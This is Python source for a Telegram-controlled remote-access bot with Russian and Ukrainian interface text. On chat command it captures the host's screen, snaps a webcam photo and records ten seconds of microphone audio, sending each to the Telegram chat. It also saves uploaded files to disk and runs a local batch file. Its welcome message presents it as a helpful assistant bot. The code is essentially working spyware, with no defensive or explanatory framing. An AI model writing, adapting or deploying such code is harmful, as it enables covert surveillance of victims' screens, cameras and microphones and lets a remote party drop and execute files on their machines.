import pyautogui
import cv2
import telebot
import os
import os.path
import random
from telebot import types
import subprocess

from subprocess import Popen, PIPE
from os.path import abspath, dirname, join

import sounddevice as sd
from scipy.io.wavfile import write

ran = 0
bot = telebot.TeleBot("")
@bot.message_handler(commands=["start"])
def keyboard(message):
    key = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("PHOTO")
    item2 = types.KeyboardButton("AUDIO")
    key.add(item1, item2)

    bot.send_message(message.chat.id, "Добро пожаловать, {0.first_name}!\nЯ - <b>{1.first_name}</b>, бот созданный чтобы облегчить вам жизнь.".format(
        message.from_user, bot.get_me()), parse_mode='html', reply_markup=key)


@bot.message_handler(content_types=['document'])
def handle_docs_photo(message):
    try:
        chat_id = message.chat.id

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        src = 'C:/tmp/' + message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, "Пожалуй, я сохраню это")
    except Exception as e:
        bot.reply_to(message, e)


@bot.message_handler(content_types=['text'])
def Klava(message):
    if message.chat.type == 'private':
        if message.text == 'PHOTO':
            # =================== Клава повідомленнь ==================
            markup = types.InlineKeyboardMarkup(row_width=3)
            item1 = types.InlineKeyboardButton(
                "SCREEN MONITOR", callback_data='screen')
            item2 = types.InlineKeyboardButton(
                "PHOTO VEB CAM", callback_data='vebcam')
            item3 = types.InlineKeyboardButton(
                "START-SH", callback_data='starsh')

            markup.add(item1, item2, item3)

            bot.send_message(
                message.chat.id, '\t🙏 Вибери Щось 🙏', reply_markup=markup)
        elif message.text == 'AUDIO':
            markup = types.InlineKeyboardMarkup(row_width=1)
            item1 = types.InlineKeyboardButton(
                "START RECORD", callback_data='record')
            item2 = types.InlineKeyboardButton(
                "STOP RECORD", callback_data='stop_record')
            markup.add(item1) #Кількість кнопок

            bot.send_message(
                message.chat.id, '\tОпції запису🎤', reply_markup=markup)
        else:
            bot.send_message(message.chat.id, 'ОК 😢')


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    try:
        if call.message:
            if call.data == 'screen':
                scr = os.path.isfile("screenshot0.png")
                pyautogui.screenshot("screenshot0.png")
                screen = open("screenshot0.png", "rb")
                bot.send_photo(call.message.chat.id, screen)
                pyautogui.screenshot("screenshot0.png")
            elif call.data == 'vebcam':
                try:
                    videoCaptureObject = cv2.VideoCapture(0)
                    result = True
                    while(result):
                        ret, frame = videoCaptureObject.read()
                        cv2.imwrite("NewPicture.jpg", frame)
                        result = False
                    videoCaptureObject.release()
                    cv2.destroyAllWindows()
                    photo = open("NewPicture.jpg", "rb")
                    bot.send_photo(call.message.chat.id, photo)
                    scr = os.path.isfile(
                        "NewPicture.jpg")
                except:
                    bot.send_message(call.message.chat.id, "WebCam not found")
            elif call.data == 'starsh':
                path = abspath(join(dirname(__file__), 'test.bat'))
                subprocess.call(
                    [path])

            elif call.data == 'record':
                print("R")
                fs = 44100  # Sample rate
                seconds = 10  # Duration of recording

                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()  # Wait until recording is finished
                write('output.wav', fs, myrecording)  # Save as WAV file 
                record = open("output.wav", "rb")
                bot.send_audio(call.message.chat.id, record)


            elif call.data == 'stop_record':
                print("RS")


            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Дані відправлено!",
                                  reply_markup=None)

    except Exception as e:
        print(repr(e))


bot.polling(none_stop=True)
